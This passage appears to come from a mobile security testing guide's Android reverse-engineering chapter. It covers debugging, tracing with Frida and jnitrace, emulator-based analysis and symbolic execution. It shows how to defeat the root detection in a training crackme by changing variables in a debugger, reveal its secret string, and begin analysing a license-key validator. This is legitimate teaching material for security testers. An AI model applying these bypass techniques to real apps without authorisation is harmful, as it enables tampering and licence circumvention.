classes that are normally ignored by debuggers.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/88882390b46ffa938d25cc2171b9d17ae601e321.png}
\caption{Images/Chapters/0x05c/Force\_Step\_Into.png}
\end{figure}

Once you ``Force Step Into'', the debugger will stop at the beginning of
the next method, which is the \texttt{a} method of the class
\texttt{sg.vantagepoint.a.c}.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/f6aca067d3cb055ccf6710f43ba1803d1c3cb9f6.png}
\caption{Images/Chapters/0x05c/fucntion\_a\_of\_class\_sg\_vantagepoint\_a.png}
\end{figure}

This method searches for the ``su'' binary within a list of directories
(\texttt{/system/xbin} and others). Since you're running the app on a
rooted device/emulator, you need to defeat this check by manipulating
variables and/or function return values.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/f6aca067d3cb055ccf6710f43ba1803d1c3cb9f6.png}
\caption{Images/Chapters/0x05c/fucntion\_a\_of\_class\_sg\_vantagepoint\_a.png}
\end{figure}

You can see the directory names inside the ``Variables'' window by
clicking ``Step Over'' the Debugger view to step into and through the
\texttt{a} method.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/be767c8387e4fa818e0d2472725ba354bbed9963.png}
\caption{Images/Chapters/0x05c/step\_over.png}
\end{figure}

Step into the \texttt{System.getenv} method with the ``Force Step Into''
feature.

After you get the colon-separated directory names, the debugger cursor
will return to the beginning of the \texttt{a} method, not to the next
executable line. This happens because you're working on the decompiled
code instead of the source code. This skipping makes following the code
flow crucial to debugging decompiled applications. Otherwise,
identifying the next line to be executed would become complicated.

If you don't want to debug core Java and Android classes, you can step
out of the function by clicking ``Step Out'' in the Debugger view. Using
``Force Step Into'' might be a good idea once you reach the decompiled
sources and ``Step Out'' of the core Java and Android classes. This will
help speed up debugging while you keep an eye on the return values of
the core class functions.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/41267d580ddfdde69914ed30df95961c12bcccd2.png}
\caption{Images/Chapters/0x05c/step\_out.png}
\end{figure}

After the \texttt{a} method gets the directory names, it will search for
the \texttt{su} binary within these directories. To defeat this check,
step through the detection method and inspect the variable content. Once
execution reaches a location where the \texttt{su} binary would be
detected, modify one of the variables holding the file name or directory
name by pressing F2 or right-clicking and choosing ``Set Value''.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/2227ece3978c331f17f61ab16971637b28978e2b.png}
\caption{Images/Chapters/0x05c/set\_value.png}
\end{figure}

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/436e8051f1cc1455cba06b72c3b43af389e741a0.png}
\caption{Images/Chapters/0x05c/modified\_binary\_name.png}
\end{figure}

Once you modify the binary name or the directory name,
\texttt{File.exists} should return \texttt{false}.

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/355be076b7f1150d56bfc6db6f006e480d86342c.png}
\caption{Images/Chapters/0x05c/file\_exists\_false.png}
\end{figure}

This defeats the first root detection control of UnCrackable App for
Android Level 1. The remaining anti-tampering and anti-debugging
controls can be defeated in similar ways so that you can finally reach
the secret string verification functionality.

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/6fb02bb0034224ded58a891172cdf90fac1b99c2.png}
\caption{Anti Debugging and Tampering Defeated}
\end{figure}

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/e25a98359ba7bd5a62406e7235ab1a6aa4d784e1.png}
\caption{Images/Chapters/0x05c/MainActivity\_verify.png}
\end{figure}

The secret code is verified by the method \texttt{a} of class
\texttt{sg.vantagepoint.uncrackable1.a}. Set a breakpoint on method
\texttt{a} and ``Force Step Into'' when you reach the breakpoint. Then,
single-step until you reach the call to \texttt{String.equals}. This is
where user input is compared with the secret string.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/6b6d5a67bd3b76357dc552be5af26f9719a0a5d2.png}
\caption{Images/Chapters/0x05c/sg\_vantagepoint\_uncrackable1\_a\_function\_a.png}
\end{figure}

You can see the secret string in the ``Variables'' view when you reach
the \texttt{String.equals} method call.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/1335eef4fd499e31b736d73fe8df57f38edc11a2.png}
\caption{Images/Chapters/0x05c/secret\_code.png}
\end{figure}

\begin{figure}
\centering
\includegraphics[width=3.125in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/d0f6dbdba327db2d0324dd91e49a89bfbca238ff.png}
\caption{Success}
\end{figure}

\hypertarget{debugging-native-code}{%
\subparagraph{Debugging Native Code}\label{debugging-native-code}}

Native code on Android is packed into ELF shared libraries and runs just
like any other native Linux program. Consequently, you can debug it with
standard tools (including GDB and built-in IDE debuggers such as IDA Pro
and JEB) as long as they support the device's processor architecture
(most devices are based on ARM chipsets, so this is usually not an
issue).

You'll now set up your JNI demo app, HelloWorld-JNI.apk, for debugging.
It's the same APK you downloaded in ``Statically Analyzing Native
Code''. Use \texttt{adb\ install} to install it on your device or on an
emulator.

\begin{verbatim}
$ adb install HelloWorld-JNI.apk
\end{verbatim}

If you followed the instructions at the beginning of this chapter, you
should already have the Android NDK. It contains prebuilt versions of
gdbserver for various architectures. Copy the gdbserver binary to your
device:

\begin{verbatim}
$ adb push $NDK/prebuilt/android-arm/gdbserver/gdbserver /data/local/tmp
\end{verbatim}

The \texttt{gdbserver\ -\/-attach} command causes gdbserver to attach to
the running process and bind to the IP address and port specified in
\texttt{comm}, which in this case is a HOST:PORT descriptor. Start
HelloWorldJNI on the device, then connect to the device and determine
the PID of the HelloWorldJNI process (sg.vantagepoint.helloworldjni).
Then switch to the root user and attach \texttt{gdbserver}:

\begin{verbatim}
$ adb shell
$ ps | grep helloworld
u0_a164   12690 201   1533400 51692 ffffffff 00000000 S sg.vantagepoint.helloworldjni
$ su
# /data/local/tmp/gdbserver --attach localhost:1234 12690
Attached; pid = 12690
Listening on port 1234
\end{verbatim}

The process is now suspended, and \texttt{gdbserver} is listening for
debugging clients on port \texttt{1234}. With the device connected via
USB, you can forward this port to a local port on the host with the
\texttt{abd\ forward} command:

\begin{verbatim}
$ adb forward tcp:1234 tcp:1234
\end{verbatim}

You'll now use the prebuilt version of \texttt{gdb} included in the NDK
toolchain.

\begin{verbatim}
$ $TOOLCHAIN/bin/gdb libnative-lib.so
GNU gdb (GDB) 7.11
(...)
Reading symbols from libnative-lib.so...(no debugging symbols found)...done.
(gdb) target remote :1234
Remote debugging using :1234
0xb6e0f124 in ?? ()
\end{verbatim}

You have successfully attached to the process! The only problem is that
you're already too late to debug the JNI function
\texttt{StringFromJNI}; it only runs once, at startup. You can solve
this problem by activating the ``Wait for Debugger'' option. Go to
\textbf{Developer Options} -\textgreater{} \textbf{Select debug app} and
pick HelloWorldJNI, then activate the \textbf{Wait for debugger} switch.
Then terminate and re-launch the app. It should be suspended
automatically.

Our objective is to set a breakpoint at the first instruction of the
native function
\texttt{Java\_sg\_vantagepoint\_helloworldjni\_MainActivity\_stringFromJNI}
before resuming the app. Unfortunately, this isn't possible at this
point in the execution because \texttt{libnative-lib.so} isn't yet
mapped into process memory---it is loaded dynamically during runtime. To
get this working, you'll first use jdb to gently change the process into
the desired state.

First, resume execution of the Java VM by attaching jdb. You don't want
the process to resume immediately though, so pipe the \texttt{suspend}
command into jdb:

\begin{verbatim}
$ adb jdwp
14342
$ adb forward tcp:7777 jdwp:14342
$ { echo "suspend"; cat; } | jdb -attach localhost:7777
\end{verbatim}

Next, suspend the process where the Java runtime loads
\texttt{libnative-lib.so}. In jdb, set a breakpoint at the
\texttt{java.lang.System.loadLibrary} method and resume the process.
After the breakpoint has been reached, execute the \texttt{step\ up}
command, which will resume the process until
\texttt{loadLibrary}returns. At this point, \texttt{libnative-lib.so}
has been loaded.

\begin{verbatim}
> stop in java.lang.System.loadLibrary
> resume
All threads resumed.
Breakpoint hit: "thread=main", java.lang.System.loadLibrary(), line=988 bci=0
> step up
main[1] step up
>
Step completed: "thread=main", sg.vantagepoint.helloworldjni.MainActivity.<clinit>(), line=12 bci=5

main[1]
\end{verbatim}

Execute \texttt{gdbserver} to attach to the suspended app. This will
cause the app to be suspended by both the Java VM and the Linux kernel
(creating a state of ``double-suspension'').

\begin{verbatim}
$ adb forward tcp:1234 tcp:1234
$ $TOOLCHAIN/arm-linux-androideabi-gdb libnative-lib.so
GNU gdb (GDB) 7.7
Copyright (C) 2014 Free Software Foundation, Inc.
(...)
(gdb) target remote :1234
Remote debugging using :1234
0xb6de83b8 in ?? ()
\end{verbatim}

\hypertarget{tracing}{%
\paragraph{Tracing}\label{tracing}}

\hypertarget{execution-tracing}{%
\subparagraph{Execution Tracing}\label{execution-tracing}}

Besides being useful for debugging, the jdb command line tool offers
basic execution tracing functionality. To trace an app right from the
start, you can pause the app with the Android ``Wait for Debugger''
feature or a \texttt{kill\ –STOP} command and attach jdb to set a
deferred method breakpoint on any initialization method. Once the
breakpoint is reached, activate method tracing with the
\texttt{trace\ go\ methods} command and resume execution. jdb will dump
all method entries and exits from that point onwards.

\begin{verbatim}
$ adb forward tcp:7777 jdwp:7288
$ { echo "suspend"; cat; } | jdb -attach localhost:7777
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> All threads suspended.
> stop in com.acme.bob.mobile.android.core.BobMobileApplication.<clinit>()
Deferring breakpoint com.acme.bob.mobile.android.core.BobMobileApplication.<clinit>().
It will be set after the class is loaded.
> resume
All threads resumed.M
Set deferred breakpoint com.acme.bob.mobile.android.core.BobMobileApplication.<clinit>()

Breakpoint hit: "thread=main", com.acme.bob.mobile.android.core.BobMobileApplication.<clinit>(), line=44 bci=0
main[1] trace go methods
main[1] resume
Method entered: All threads resumed.
\end{verbatim}

The Dalvik Debug Monitor Server (DDMS) is a GUI tool included with
Android Studio. It may not look like much, but its Java method tracer is
one of the most awesome tools you can have in your arsenal, and it is
indispensable for analyzing obfuscated bytecode.

DDMS is somewhat confusing, however; it can be launched several ways,
and different trace viewers will be launched depending on how a method
was traced. There's a standalone tool called ``Traceview'' as well as a
built-in viewer in Android Studio, both of which offer different ways to
navigate the trace. You'll usually use Android studio's built-in viewer,
which gives you a zoom-able hierarchical timeline of all method calls.
The standalone tool, however, is also useful---it has a profile panel
that shows the time spent in each method and the parents and children of
each method.

To record an execution trace in Android Studio, open the
\textbf{Android} tab at the bottom of the GUI. Select the target process
in the list and click the little \textbf{stop watch} button on the left.
This starts the recording. Once you're done, click the same button to
stop the recording. The integrated trace view will open and show the
recorded trace. You can scroll and zoom the timeline view with the mouse
or trackpad.

Execution traces can also be recorded in the standalone Android Device
Monitor. The Device Monitor can be started within Android Studio
(\textbf{Tools} -\textgreater{} \textbf{Android} -\textgreater{}
\textbf{Android Device Monitor}) or from the shell with the
\texttt{ddms} command.

To start recording tracing information, select the target process in the
\textbf{Devices} tab and click \textbf{Start Method Profiling}. Click
the \textbf{stop} button to stop recording, after which the Traceview
tool will open and show the recorded trace. Clicking any of the methods
in the profile panel highlights the selected method in the timeline
panel.

DDMS also offers a convenient heap dump button that will dump the Java
heap of a process to a .hprof file. The Android Studio user guide
contains more information about Traceview.

Tracing System Calls

Moving down a level in the OS hierarchy, you arrive at privileged
functions that require the powers of the Linux kernel. These functions
are available to normal processes via the system call interface.
Instrumenting and intercepting calls into the kernel is an effective
method for getting a rough idea of what a user process is doing, and
often the most efficient way to deactivate low-level tampering defenses.

Strace is a standard Linux utility that is not included with Android by
default, but can be easily built from source via the Android NDK. It
monitors the interaction between processes and the kernel, being a very
convenient way to monitor system calls. However, there's a downside: as
strace depends on the \texttt{ptrace} system call to attach to the
target process, once anti-debugging measures become active it will stop
working.

If the ``Wait for debugger'' feature in \textbf{Settings \textgreater{}
Developer options} is unavailable, you can use a shell script to launch
the process and immediately attach strace (not an elegant solution, but
it works):

\begin{verbatim}
$ while true; do pid=$(pgrep 'target_process' | head -1); if [[ -n "$pid" ]]; then strace -s 2000 - e "!read" -ff -p "$pid"; break; fi; done
\end{verbatim}

Ftrace

Ftrace is a tracing utility built directly into the Linux kernel. On a
rooted device, ftrace can trace kernel system calls more transparently
than strace can (strace relies on the ptrace system call to attach to
the target process).

Conveniently, the stock Android kernel on both Lollipop and Marshmallow
include ftrace functionality. The feature can be enabled with the
following command:

\begin{verbatim}
$ echo 1 > /proc/sys/kernel/ftrace_enabled
\end{verbatim}

The \texttt{/sys/kernel/debug/tracing} directory holds all control and
output files related to ftrace. The following files are found in this
directory:

\begin{itemize}
\tightlist
\item
  available\_tracers: This file lists the available tracers compiled
  into the kernel.
\item
  current\_tracer: This file sets or displays the current tracer.
\item
  tracing\_on: Echo ``1'' into this file to allow/start update of the
  ring buffer. Echoing ``0'' will prevent further writes into the ring
  buffer.
\end{itemize}

KProbes

The KProbes interface provides an even more powerful way to instrument
the kernel: it allows you to insert probes into (almost) arbitrary code
addresses within kernel memory. KProbes inserts a breakpoint instruction
at the specified address. Once the breakpoint is reached, control passes
to the KProbes system, which then executes the user-defined handler
function(s) and the original instruction. Besides being great for
function tracing, KProbes can implement rootkit-like functionality, such
as file hiding.

Jprobes and Kretprobes are other KProbes-based probe types that allow
hooking of function entries and exits.

The stock Android kernel comes without loadable module support, which is
a problem because Kprobes are usually deployed as kernel modules. The
strict memory protection the Android kernel is compiled with is another
issue because it prevents the patching of some parts of Kernel memory.
Elfmaster's system call hooking method causes a Kernel panic on stock
Lollipop and Marshmallow because the sys\_call\_table is non-writable.
You can, however, use KProbes in a sandbox by compiling your own, more
lenient Kernel (more on this later).

\hypertarget{method-tracing}{%
\subparagraph{Method Tracing}\label{method-tracing}}

In contrast to method profiling, which tells you how frequently a method
is being called, method tracing helps you to also determine its input
and output values. This technique can prove to be very useful when
dealing with applications that have a big codebase and/or are
obfuscated.

As we will discuss shortly in the next section, \texttt{frida-trace}
offers out-of-the-box support for Android/iOS native code tracing and
iOS high level method tracing. While it
\href{https://github.com/frida/frida-python/issues/70}{doesn't support
Java method tracing yet}, you can still use regular Frida scripting and
hooking in order to perform Java method tracing.

\hypertarget{native-code-tracing}{%
\subparagraph{Native Code Tracing}\label{native-code-tracing}}

Native methods tracing can be performed with relative ease than compared
to Java method tracing. \texttt{frida-trace} is a CLI tool for
dynamically tracing function calls. It makes tracing native functions
trivial and can be very useful for collecting information about an
application.

In order to use \texttt{frida-trace}, a Frida server should be running
on the device. An example for tracing libc's \texttt{open} function
using \texttt{frida-trace} is demonstrated below, where \texttt{-U}
connects to the USB device and \texttt{-i} specifies the function to be
included in the trace.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}trace}\NormalTok{ {-}U {-}i }\StringTok{"open"}\NormalTok{ com.android.chrome}
\end{Highlighting}
\end{Shaded}

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/edb98d4210c76f2964570cb2d22ab456c3330ccb.png}
\caption{Images/Chapters/0x05c/frida\_trace\_native\_functions.png}
\end{figure}

Note how, by default, only the arguments passed to the function are
shown, but not the return values. Under the hood, \texttt{frida-trace}
generates one little JavaScript handler file per matched function in the
auto-generated \texttt{\_\_handlers\_\_} folder, which Frida then
injects into the process. You can edit these files for more advanced
usage such as obtaining the return value of the functions, their input
parameters, accessing the memory, etc. Check Frida's
\href{https://www.frida.re/docs/javascript-api/}{JavaScript API} for
more details.

In this case, the generated script which traces all calls to the
\texttt{open} function in \texttt{libc.so} is located in is
\texttt{\_\_handlers\_\_/libc.so/open.js}, it looks as follows:

\begin{Shaded}
\begin{Highlighting}[]
\OperatorTok{\{}
  \DataTypeTok{onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ args}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}
    \AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}open(\textquotesingle{}} \OperatorTok{+}
      \StringTok{\textquotesingle{}path="\textquotesingle{}} \OperatorTok{+}\NormalTok{ args[}\DecValTok{0}\NormalTok{].}\AttributeTok{readUtf8String}\NormalTok{() }\OperatorTok{+} \StringTok{\textquotesingle{}"\textquotesingle{}} \OperatorTok{+}
      \StringTok{\textquotesingle{}, oflag=\textquotesingle{}} \OperatorTok{+}\NormalTok{ args[}\DecValTok{1}\NormalTok{] }\OperatorTok{+}
    \StringTok{\textquotesingle{})\textquotesingle{}}\NormalTok{)}\OperatorTok{;}
  \OperatorTok{\},}


  \DataTypeTok{onLeave}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ retval}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}
      \AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}}\SpecialCharTok{\textbackslash{}t}\StringTok{ return: \textquotesingle{}} \OperatorTok{+}\NormalTok{ retval)}\OperatorTok{;}\NormalTok{      \textbackslash{}\textbackslash{} edited}
  \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

In the above script, \texttt{onEnter} takes care of logging the calls to
this function and its two input parameters in the right format. You can
edit the \texttt{onLeave} event to print the return values as shown
above.

\begin{quote}
Note that libc is a well-known library, Frida is able to derive the
input parameters of its \texttt{open} function and automatically log
them correctly. But this won't be the case for other libraries or for
Android Kotlin/Java code. In that case, you may want to obtain the
signatures of the functions you're interested in by referring to Android
Developers documentation or by reverse engineer the app first.
\end{quote}

Another thing to notice in the output above is that it's colorized. An
application can have multiple threads running, and each thread can call
the \texttt{open} function independently. By using such a color scheme,
the output can be easily visually segregated for each thread.

\texttt{frida-trace} is a very versatile tool and there are multiple
configuration options available such as:

\begin{itemize}
\tightlist
\item
  Including \texttt{-I} and excluding \texttt{-X} entire modules.
\item
  Tracing all JNI functions in an Android application using
  \texttt{-i\ "Java\_*"} (note the use of a glob \texttt{*} to match all
  possible functions starting with ``Java\_'').
\item
  Tracing functions by address when no function name symbols are
  available (stripped binaries), e.g.~\texttt{-a\ "libjpeg.so!0x4793c"}.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}trace}\NormalTok{ {-}U {-}i }\StringTok{"Java\_*"}\NormalTok{ com.android.chrome}
\end{Highlighting}
\end{Shaded}

Many binaries are stripped and don't have function name symbols
available with them. In such cases, a function can be traced using its
address as well.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}trace}\NormalTok{ {-}p 1372 {-}a }\StringTok{"libjpeg.so!0x4793c"}
\end{Highlighting}
\end{Shaded}

To learn more about all options for advanced usage, check the
\href{https://frida.re/docs/frida-trace/}{documentation in the official
Frida website}.

\hypertarget{jni-tracing}{%
\subparagraph{JNI Tracing}\label{jni-tracing}}

As detailed in section
\protect\hyperlink{reviewing-disassembled-native-code}{Reviewing
Disassembled Native Code}, the first argument passed to every JNI
function is a JNI interface pointer. This pointer contains a table of
functions that allows native code to access the Android Runtime.
Identifying calls to these functions can help with understanding library
functionality, such as what strings are created or Java methods are
called.

\href{https://github.com/chame1eon/jnitrace}{jnitrace} is a Frida based
tool similar to frida-trace which specifically targets the usage of
Android's JNI API by native libraries, providing a convenient way to
obtain JNI method traces including arguments and return values.

You can easily install it by running \texttt{pip\ install\ jnitrace} and
run it straightaway as follows:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{jnitrace}\NormalTok{ {-}l libnative{-}lib.so sg.vantagepoint.helloworldjni}
\end{Highlighting}
\end{Shaded}

\begin{quote}
The \texttt{-l} option can be provided multiple times to trace multiple
libraries, or \texttt{*} can be provided to trace all libraries. This,
however, may provide a lot of output.
\end{quote}

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/fb1b26788aead664e5a0f41c958b592f8669d389.png}
\caption{Images/Chapters/0x05c/jni\_tracing\_helloworldjni.png}
\end{figure}

In the output you can see the trace of a call to \texttt{NewStringUTF}
made from the native code (its return value is then given back to Java
code, see section
``\protect\hyperlink{reviewing-disassembled-native-code}{Reviewing
Disassembled Native Code}'' for more details). Note how similarly to
frida-trace, the output is colorized helping to visually distinguish the
different threads.

When tracing JNI API calls you can see the thread ID at the top,
followed by the JNI method call including the method name, the input
arguments and the return value. In the case of a call to a Java method
from native code, the Java method arguments will also be supplied.
Finally jnitrace will attempt to use the Frida backtracing library to
show where the JNI call was made from.

To learn more about all options for advanced usage, check the
\href{https://github.com/chame1eon/jnitrace}{documentation on the
jnitrace GitHub page}.

\hypertarget{emulation-based-analysis}{%
\paragraph{Emulation-based Analysis}\label{emulation-based-analysis}}

The Android emulator is based on QEMU, a generic and open source machine
emulator. QEMU emulates a guest CPU by translating the guest
instructions on-the-fly into instructions the host processor can
understand. Each basic block of guest instructions is disassembled and
translated into an intermediate representation called Tiny Code
Generator (TCG). The TCG block is compiled into a block of host
instructions, stored in a code cache, and executed. After execution of
the basic block, QEMU repeats the process for the next block of guest
instructions (or loads the already translated block from the cache). The
whole process is called dynamic binary translation.

Because the Android emulator is a fork of QEMU, it comes with all QEMU
features, including monitoring, debugging, and tracing facilities.
QEMU-specific parameters can be passed to the emulator with the
\texttt{-qemu} command line flag. You can use QEMU's built-in tracing
facilities to log executed instructions and virtual register values.
Starting QEMU with the \texttt{-d} command line flag will cause it to
dump the blocks of guest code, micro operations, or host instructions
being executed. With the \texttt{–d\_asm} flag, QEMU logs all basic
blocks of guest code as they enter QEMU's translation function. The
following command logs all translated blocks to a file:

\begin{verbatim}
$ emulator -show-kernel -avd Nexus_4_API_19 -snapshot default-boot -no-snapshot-save -qemu -d in_asm,cpu 2>/tmp/qemu.log
\end{verbatim}

Unfortunately, generating a complete guest instruction trace with QEMU
is impossible because code blocks are written to the log only at the
time they are translated---not when they're taken from the cache. For
example, if a block is repeatedly executed in a loop, only the first
iteration will be printed to the log. There's no way to disable TB
caching in QEMU (besides hacking the source code). Nevertheless, the
functionality is sufficient for basic tasks, such as reconstructing the
disassembly of a natively executed cryptographic algorithm.

Dynamic analysis frameworks, such as PANDA and DroidScope, build on
QEMU's tracing functionality. PANDA/PANDROID is the best choice if
you're going for a CPU-trace based analysis because it allows you to
easily record and replay a full trace and is relatively easy to set up
if you follow the build instructions for Ubuntu.

\hypertarget{droidscope}{%
\subparagraph{DroidScope}\label{droidscope}}

DroidScope (an extension to the
\href{https://github.com/sycurelab/DECAF}{DECAF dynamic analysis
framework})is a malware analysis engine based on QEMU. It instruments
the emulated environment on several context levels, making it possible
to fully reconstruct the semantics on the hardware, Linux and Java
levels.

DroidScope exports instrumentation APIs that mirror the different
context levels (hardware, OS, and Java) of a real Android device.
Analysis tools can use these APIs to query or set information and
register callbacks for various events. For example, a plugin can
register callbacks for native instruction start and end, memory reads
and writes, register reads and writes, system calls, and Java method
calls.

All of this makes it possible to build tracers that are practically
transparent to the target application (as long as we can hide the fact
that it is running in an emulator). One limitation is that DroidScope is
compatible with the Dalvik VM only.

\hypertarget{panda}{%
\subparagraph{PANDA}\label{panda}}

\href{https://github.com/moyix/panda/blob/master/docs/}{PANDA} is
another QEMU-based dynamic analysis platform. Similar to DroidScope,
PANDA can be extended by registering callbacks that are triggered by
certain QEMU events. The twist PANDA adds is its record/replay feature.
This allows an iterative workflow: the reverse engineer records an
execution trace of the target app (or some part of it), then replays it
repeatedly, refining the analysis plugins with each iteration.

PANDA comes with pre-made plugins, including a string search tool and a
syscall tracer. Most importantly, it supports Android guests, and some
of the DroidScope code has even been ported. Building and running PANDA
for Android (``PANDROID'') is relatively straightforward. To test it,
clone Moiyx's git repository and build PANDA:

\begin{verbatim}
$ cd qemu
$ ./configure --target-list=arm-softmmu --enable-android
$ make
\end{verbatim}

As of this writing, Android versions up to 4.4.1 run fine in PANDROID,
but anything newer than that won't boot. Also, the Java level
introspection code only works on the Android 2.3 (API level 9) Dalvik
runtime. Older versions of Android seem to run much faster in the
emulator, so sticking with Gingerbread is probably best if you plan to
use PANDA. For more information, check out the extensive documentation
in the PANDA git repository.

\hypertarget{vxstripper}{%
\subparagraph{VxStripper}\label{vxstripper}}

Another very useful tool built on QEMU is
\href{http://vxstripper.pagesperso-orange.fr}{VxStripper by Sébastien
Josse}. VXStripper is specifically designed for de-obfuscating binaries.
By instrumenting QEMU's dynamic binary translation mechanisms, it
dynamically extracts an intermediate representation of a binary. It then
applies simplifications to the extracted intermediate representation and
recompiles the simplified binary with LLVM. This is a very powerful way
of normalizing obfuscated programs. See
\href{http://ieeexplore.ieee.org/document/6759227/}{Sébastien's paper}
for more information {[}\#josse{]}.

\hypertarget{binary-analysis}{%
\paragraph{Binary Analysis}\label{binary-analysis}}

Binary analysis frameworks give you powerful ways to automate tasks that
would be almost impossible to do manually. Binary analysis frameworks
typically use a technique called symbolic execution, which allow to
determine the conditions necessary to reach a specific target. It
translates the program's semantics into a logical formula in which some
variables are represented by symbols with specific constraints. By
resolving the constraints, you can find the conditions necessary for the
execution of some branch of the program.

\hypertarget{symbolic-execution}{%
\subparagraph{Symbolic Execution}\label{symbolic-execution}}

Symbolic execution is a very useful technique to have in your toolbox,
especially while dealing with problems where you need to find a correct
input for reaching a certain block of code. In this section, we will
solve a simple Android crackme by using the Angr binary analysis
framework as our symbolic execution engine. An overview of Angr and its
installation instructions has been covered previously in
``\href{0x05b-Basic-Security_Testing.md}{Android Basic Security
Testing}'' chapter.

The target crackme is a simple
\href{https://github.com/angr/angr-doc/tree/master/examples/android_arm_license_validation}{Android
license key validation} executable. As we will soon observe, the key
validation logic in the crackme is implemented in native code. It is a
common notion that analyzing compiled native code is tougher than
analyzing an equivalent compiled Java code, and hence, critical business
logic is often written in native. The current sample application may not
represent a real world problem, but nevertheless it helps getting some
basic notions about symbolic execution that you can use in a real
situation. You can use the same techniques on Android apps that ship
with obfuscated native libraries (in fact, obfuscated code is often put
into native libraries specifically to make de-obfuscation more
difficult).

The crackme consists of a single ELF executable file, which can be
executed on any Android device by following the instructions below:

\begin{verbatim}
$ adb push validate /data/local/tmp
[100%] /data/local/tmp/validate

$ adb shell chmod 755 /data/local/tmp/validate

$ adb shell /data/local/tmp/validate
Usage: ./validate <serial>

$ adb shell /data/local/tmp/validate 12345
Incorrect serial (wrong format).
\end{verbatim}

So far so good, but we know nothing about what a valid license key looks
like. To get started, open the ELF executable in a disassembler such as
Cutter. The main function is located at offset \texttt{0x00001874} in
the disassembly. It is important to note that this binary is
PIE-enabled, and Cutter chooses to load the binary at \texttt{0x0} as
image base address.

\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/43b2caf15e7d55029ae04597beb74c2ca7c74342.png}
{Disassembly of main function}

The function names have been stripped from the binary, but luckily there
are enough debugging strings to provide us a context to the code. Moving
forward, we will start analyzing the binary from the entry function at
offset \texttt{0x00001874}, and keep a note of all the information
easily available to us. During this analysis, we will also try to
identify the code regions which are suitable for symbolic execution.

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/a9a7d2d1f4cd59ad389154d6c3aae7dad92f39e7.png}
\caption{Images/Chapters/0x05c/graph\_1874.png}
\end{figure}

\texttt{strlen} is called at offset \texttt{0x000018a8}, and the
returned value is compared to 0x10 at offset \texttt{0x000018b0}.
Immediately after that, the input string is passed to a Base32 decoding
function at offset \texttt{0x00001340}. This provides us with valuable
information that the input license key is a Base32-encoded 16-character
string (which totals 10 bytes in raw). The decoded input is then passed
to the function at offset \texttt{0x00001760}, which validates the
license key. The disassembly of this function is shown below.

We can now use this information about the expected input to further look
into the validation function at \texttt{0x00001760}.

\begin{verbatim}
╭ (fcn) fcn.00001760 268
│   fcn.00001760 (int32_t arg1);
│           ; var int32_t var_20h @ fp-0x20
│           ; var int32_t var_14h @ fp-0x14
│           ; var int32_t var_10h @ fp-0x10
│           ; arg int32_t arg1 @ r0
│           ; CALL XREF from fcn.00001760 (+0x1c4)
│           0x00001760      push {r4, fp, lr}
│           0x00001764      add fp, sp, 8
│           0x00001768      sub sp, sp, 0x1c
│           0x0000176c      str r0, [var_20h]                          ; 0x20 ; "$!" ; arg1
│           0x00001770      ldr r3, [var_20h]                          ; 0x20 ; "$!" ; entry.preinit0
│           0x00001774      str r3, [var_10h]                          ; str.
│                                                                      ; 0x10
│           0x00001778      mov r3, 0
│           0x0000177c      str r3, [var_14h]                          ; 0x14
│       ╭─< 0x00001780      b 0x17d0
│       │   ; CODE XREF from fcn.00001760 (0x17d8)
│      ╭──> 0x00001784      ldr r3, [var_10h]                          ; str.
│       │                                                              ; 0x10 ; entry.preinit0
│      ╎│   0x00001788      ldrb r2, [r3]
│      ╎│   0x0000178c      ldr r3, [var_10h]                          ; str.
│      ╎│                                                              ; 0x10 ; entry.preinit0
│      ╎│   0x00001790      add r3, r3, 1
│      ╎│   0x00001794      ldrb r3, [r3]
│      ╎│   0x00001798      eor r3, r2, r3
│      ╎│   0x0000179c      and r2, r3, 0xff
│      ╎│   0x000017a0      mvn r3, 0xf
│      ╎│   0x000017a4      ldr r1, [var_14h]                          ; 0x14 ; entry.preinit0
